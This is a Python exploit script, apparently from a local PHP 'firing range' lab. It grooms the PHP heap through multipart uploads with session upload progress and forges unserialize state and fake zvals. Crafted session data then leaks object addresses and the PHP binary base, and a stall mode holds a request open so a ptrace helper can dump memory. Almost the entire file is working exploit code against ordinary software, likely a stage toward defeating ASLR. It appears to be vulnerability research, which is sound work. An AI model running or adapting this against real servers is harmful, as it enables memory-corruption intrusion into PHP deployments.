#!/usr/bin/env python3
"""smb_oracle8.py — v8: groom-slot object-zval leak (in-band O leak) + stall-dump.

Placement (v7 laws, all gdb-verified):
  - 5000B VALUE part (single read => buf1 = emalloc(5001) = 2 pages) best-fit
    splits d's freed 3-page run => fake php_unserialize_data AT d+0.
  - tiny session (<=~30B) allocates in established bins => d's header untouched.

NEW in v8 (source-verified this rung):
  - session `k|R:3;o|O:8:"DateTime":0:{}`: the 'o' key decodes a DateTime.
    DateTime has __unserialize => object_common takes the delayed-__unserialize
    path: tmp_var(var_hash, 2) stores the OBJECT ZVAL BY VALUE at
    last_dtor->data[used_slots] and the elements array at +1.
  - We preset last_dtor = d+0x600 with used_slots=30 => the zval copy lands
    at d+0x7F0 (data[30].value), fully inside our groom.
  - var_push_dtor->tmp_var zeroes ONLY data[30..31] (num=2); data[29] keeps our
    forged zend_string header: val = d+0x7F0, len = K (at d+0x7E8 = data[29].u1u2).
  - k|R:3 -> data[2] -> fake zval {ptr = hdr@d+0x7D8, IS_STRING_EX}
    => writeback k|s:K:"<K bytes at d+0x7F0>" = {O, type, ary HT ptr, ...}
    => REMOTE O LEAK (the zend_object address), in-band.

STALL MODE: fire the consumer but withhold the tail of the file part for 25s
=> request alive mid-parse, object alive, session writeback already flushed
=> ptrace helper dumps d+0x7E0 (groom slots) to cross-check O, then O-0x40..O+0x60
to answer: what is at O-8 (chunk-adjacent) and O+8 (handle|extra_flags) — the
candidate `len` sources for the round-B read of ce/handlers at O+0x10.
"""
import base64
import socket
import struct
import sys
import time

sys.path.insert(0, "/home/user/php-firing-range/scripts")
import smb_q1_fatal_window as q
import smb_619_state as s
import smb_oracle2 as o2

BND = b"G"
IS_STRING_EX = 0x106
K = 32  # bytes to leak from data[30..] (object zval + ary zval)


def part(name, value):
    return (b"--" + BND + b'\r\nContent-Disposition: form-data; name="'
            + name + b'"\r\n\r\n' + value + b"\r\n")


def file_part_head(name, filename=b"a.txt"):
    return (b"--" + BND + b'\r\nContent-Disposition: form-data; name="' + name
            + b'"; filename="' + filename
            + b'"\r\nContent-Type: application/octet-stream\r\n\r\n')


def fake_d8(gaddr, k=K):
    """5000B groom: fake php_unserialize_data at gaddr (=d).
    BASE-LEAK MODE (oracle9 gdb finding): page0 slot0 holds a real
    zend_array {arData=d+0xa000, nTableSize=0x10, pDestructor=libphp fn}
    at d+0x0, written by the writeback machinery BEFORE k's serialize.
    Its own bytes form a zend_string header at d+0x10: h@0x18,
    len@0x20 = nTableSize = 16, val@0x28 = [nNextFreeElement, pDestructor].
    => data[2] fake zval {value = gaddr+0x10, IS_STRING_EX} makes the
    writeback echo 16 bytes at d+0x28 => pDestructor = base + const off."""
    b = bytearray(5000)
    struct.pack_into("<Q", b, 0x00, gaddr + 0x38)     # last = &entries
    struct.pack_into("<Q", b, 0x08, gaddr + 0x100)    # first_dtor
    struct.pack_into("<Q", b, 0x10, gaddr + 0x100)    # last_dtor  (preset used_slots=30)
    struct.pack_into("<Q", b, 0x30, 0x1000)           # max_depth
    struct.pack_into("<Q", b, 0x38, 15)               # entries.used_slots
    struct.pack_into("<Q", b, 0x40, 0)                # entries.next
    struct.pack_into("<Q", b, 0x48 + 2 * 8, gaddr + 0x400)  # data[2] -> fake zval
    # dtor entries @ +0x100 (keep object decode happy; slots land >=0x2F0)
    struct.pack_into("<Q", b, 0x100, 30)              # used_slots preset
    struct.pack_into("<Q", b, 0x108, 0)              # next
    # fake zval @ +0x400 -> zend_string hdr @ gaddr+0x10 (the real HT):
    # len = *(gaddr+0x20) = nTableSize, val = gaddr+0x28
    struct.pack_into("<Q", b, 0x400, gaddr + 0x10)
    struct.pack_into("<I", b, 0x408, IS_STRING_EX)
    return bytes(b)


def build_body(gsid, gaddr):
    g = fake_d8(gaddr)
    return (part(b"PHPSESSID", gsid.encode()) +
            part(b"PHP_SESSION_UPLOAD_PROGRESS", b"poc") +
            part(b"g", g) +
            file_part_head(b"f") + b"z" * 8192 + b"\r\n" +
            b"--" + BND + b"--\r\n")


def build_body_stall(gsid, gaddr):
    """Same, but split so we can hold the tail of the file part back."""
    g = fake_d8(gaddr)
    head = (part(b"PHPSESSID", gsid.encode()) +
            part(b"PHP_SESSION_UPLOAD_PROGRESS", b"poc") +
            part(b"g", g) +
            file_part_head(b"f"))
    held = b"z" * 4096 + b"\r\n" + b"--" + BND + b"--\r\n"
    return head, held


def send_post(body, stall=None, stall_secs=25.0):
    sk = socket.create_connection(("127.0.0.1", 8151), timeout=25)
    sk.sendall((f"POST /ping.php HTTP/1.1\r\nHost: x\r\n"
                f"Content-Type: multipart/form-data; boundary=G\r\n"
                f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
                ).encode())
    if stall is None:
        sk.sendall(body)
    else:
        head, held = stall
        sk.sendall(head)
        time.sleep(stall_secs)
        try:
            sk.sendall(held)
        except OSError:
            pass
    buf = b""
    sk.settimeout(25)
    while True:
        try:
            d = sk.recv(65536)
        except socket.timeout:
            break
        if not d:
            break
        buf += d
    sk.close()
    return buf.split(b"\r\n", 1)[0].decode(errors="replace") if buf else "(reset)"


def find_bg2(kind="vuln"):
    """BG(unserialize).data with level 1 OR 2 (2 = mid-consumer nested decode)."""
    maps = s.get_maps(kind)
    hrs = s.heap_ranges(maps)
    segs = []
    for i, l in enumerate(maps):
        if "/usr/local/bin/php" in l and "rw-p" in l:
            a, b = [int(x, 16) for x in l.split()[0].split("-")]
            if i + 1 < len(maps):
                a2, b2 = [int(x, 16) for x in maps[i + 1].split()[0].split("-")]
                if a2 == b and "rw-p" in maps[i + 1] and "php" not in maps[i + 1]:
                    segs.append((a2, b2))
    if not segs:
        return None
    seg = s.read_mem(kind, segs[0][0], segs[0][1] - segs[0][0])
    for off in range(0, len(seg) - 15, 8):
        v = int.from_bytes(seg[off:off + 8], "little")
        lvl = int.from_bytes(seg[off + 8:off + 16], "little")
        if lvl in (1, 2) and (v & 0xFFF) == 0 and s.looks_heap(v, hrs):
            return v
    return None


def stage(sid, content):
    t64 = base64.b64encode(content).decode()
    q.docker_exec(q.CT["vuln"],
                  f"F=/tmp/sess_{sid}; rm -f $F; echo {t64} | base64 -d > $F; "
                  f"chown nobody:nobody $F; chmod 600 $F")


def sess_read_b64(sid):
    rc, out = q.docker_exec(q.CT["vuln"],
                            f"base64 -w0 /tmp/sess_{sid} 2>/dev/null")
    try:
        return base64.b64decode(out.strip())
    except Exception:
        return b""


def parse_k(content):
    """Extract the raw bytes of k|s:LEN:"..." from the writeback."""
    key = b'k|s:'
    i = content.find(key)
    if i < 0:
        return None, None
    j = content.find(b':"', i + 4)
    if j < 0:
        return None, None
    ln = int(content[i + 4:j])
    data = content[j + 2:j + 2 + ln]
    return ln, data


def round_A(label, stall_dump=False, sess=b'k|R:3;o|O:9:"Exception":0:{}'):
    """Fresh restart -> producer -> groom consumer -> parse O."""
    q.docker_exec(q.CT["vuln"], "pkill -f 'php -S 0.0.0.0:8080' || true")
    q.healthy(q.VULN, deadline=15)
    time.sleep(0.5)
    sid = f"p{int(time.time())}"
    q.stage_producer("vuln", sid)
    st, _ = q.mp_min(q.VULN, sid)
    d = o2.find_bg()
    print(f"[{label}] producer={st} d=0x{d:x}" if d else f"[{label}] NO d")
    if not d:
        return None, None
    gsid = f"g{int(time.time())}{label}"
    stage(gsid, sess)
    body = build_body(gsid, d)
    maps0 = s.get_maps("vuln")
    base0 = 0
    for l in maps0:
        if "/usr/local/bin/php" in l and "r-xp" in l:
            base0 = int(l.split()[0].split("-")[0], 16)
            break
    if not stall_dump:
        status = send_post(body)
        content = sess_read_b64(gsid)
        o = None
        ln, data = (None, None)
        if content:
            ln, data = parse_k(content)
        print(f"[{label}] consumer={status} writeback={'YES' if data else 'NO'} "
              f"k-len={ln} data={data[:40].hex() if data else None}")
        if data and len(data) >= 8:
            o = int.from_bytes(data[0:8], "little")
            print(f"[{label}] q0 = 0x{o:x}  (q0-d = 0x{o - d:+x})")
        if data and len(data) >= 16:
            q1 = int.from_bytes(data[8:16], "little")
            print(f"[{label}] q1 (pDestructor?) = 0x{q1:x}  off-vs-base = "
                  f"0x{q1 - base0:x}" if base0 else f"[{label}] q1 = 0x{q1:x}")
        return d, data, base0
    # stall mode: hold the file-part tail; while stalled, dump via helper
    head, held = build_body_stall(gsid, d)
    import threading
    res = {}

    def fire():
        res["st"] = send_post(None, stall=(head, held), stall_secs=25.0)
    t = threading.Thread(target=fire)
    t.start()
    time.sleep(3.0)  # let the decode + first file-data update happen
    d2 = find_bg2()
    print(f"[{label}] stalled: BG.data={hex(d2) if d2 else None}")
    dump = {}
    if d2:
        # full picture of the groom region: what survived the request-time churn
        for lo, hi in ((0x00, 0x480), (0x7C0, 0x860)):
            g = s.read_mem("vuln", d2 + lo, hi - lo)
            dump[f"groom_{lo:x}"] = g
            print(f"--- groom d+0x{lo:x}..0x{hi:x} ---")
            for off in range(0, len(g), 8):
                v = int.from_bytes(g[off:off + 8], "little")
                if v:
                    print(f"  d+0x{lo + off:04x} = 0x{v:016x}")
        # follow the entries push: data[15] at d+0xC0 should hold &session['o'] zval
        p = None
        g0 = dump.get("groom_0")
        if g0:
            p = int.from_bytes(g0[0xC0:0xC8], "little")
            print(f"[{label}] data[15] (P = &session['o']) = 0x{p:x}")
        if p:
            zvp = s.read_mem("vuln", p, 16)
            o = int.from_bytes(zvp[0:8], "little")
            typ = int.from_bytes(zvp[8:16], "little")
            print(f"[{label}] *P = {o:#x} type=0x{typ:x}  (O-d = {o - d2:+#x})")
            dump["O"] = o
            obj = s.read_mem("vuln", o - 0x40, 0xC0)
            dump["obj"] = obj
            for off in range(0, 0xC0, 8):
                v = int.from_bytes(obj[off:off + 8], "little")
                print(f"    [O{off - 0x40:+#05x}] 0x{v:016x}")
        maps = s.get_maps("vuln")
        for l in maps:
            if "/usr/local/bin/php" in l and "r-xp" in l:
                base = int(l.split()[0].split("-")[0], 16)
                print(f"[{label}] php base (helper) = 0x{base:x}")
                dump["base"] = base
    t.join()
    print(f"[{label}] stalled consumer final status = {res.get('st')}")
    content = sess_read_b64(gsid)
    ln, data = parse_k(content)
    print(f"[{label}] stalled writeback k-len={ln} data={data[:40].hex() if data else None}")
    return d2, dump


def main():
    print("=== ORACLE v8: groom-slot object-zval leak ===")
    mode = sys.argv[1] if len(sys.argv) > 1 else "plain"
    if mode == "stall":
        d, dump = round_A("S1", stall_dump=True)
        return 0
    if mode == "matrix":
        cases = [
            ("t6b", b"k|R:3;"),
            ("t27b2", b'k|R:3;o|O:8:"stdClass":0:{}'),
            ("texc", b'k|R:3;o|O:9:"Exception":0:{}'),
            ("texc1", b'k|R:3;o|O:9:"Exception":1:{s:7:"message";s:3:"abc";}'),
        ]
        for lab, sess in cases:
            round_A(lab, sess=sess)
        return 0
    if mode == "base":
        # single-read base leak: k|R:3 -> real HT hdr at d+0x10 ->
        # 16 bytes at d+0x28 = [nNextFreeElement, pDestructor]
        prev = None
        for i in range(3):
            d, data, base = round_A(f"B{i}", sess=b'k|R:3;o|O:9:"Exception":0:{}')
            if not data or len(data) < 16:
                print(f"[B{i}] NO LEAK")
                continue
            ptr = int.from_bytes(data[8:16], "little")
            off = ptr - base
            print(f"[B{i}] *** pDestructor=0x{ptr:x} base=0x{base:x} "
                  f"offset=0x{off:x} {'== previous' if prev == off else ''} ***")
            prev = off
        return 0
    d1, data1, b1 = round_A("A1")
    d2, data2, b2 = round_A("A2")
    return 0


if __name__ == "__main__":
    sys.exit(main())
